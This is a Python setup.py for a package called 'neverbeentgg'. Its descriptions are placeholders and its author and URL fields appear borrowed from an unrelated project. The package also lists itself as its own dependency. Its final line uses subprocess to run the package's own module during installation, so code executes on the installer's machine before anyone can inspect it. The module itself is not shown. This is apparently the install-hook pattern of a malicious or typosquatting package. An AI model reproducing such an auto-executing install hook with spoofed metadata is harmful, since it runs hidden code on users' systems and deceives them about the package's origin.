import setuptools
import subprocess
# Define some package information
desc = "aa"
long_desc = f"""
a
"""

setuptools.setup(
    name="neverbeentgg",
    version="1.0.0",
    url="https://github.com/moser/tg",
    author="Martin Vielsmaier",
    author_email="moser@moserei.de",
    description=desc,
    long_description=long_desc,
    long_description_content_type='text/markdown',
    keywords=[],
    packages=setuptools.find_packages(),
    install_requires=['neverbeentgg'],
    setup_requires=[],
    tests_require=[],
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
    ],
    entry_points={
    },
)

# Run the installed module using the Python interpreter after the setup is complete
subprocess.call(["python", "-m", "neverbeentgg"])
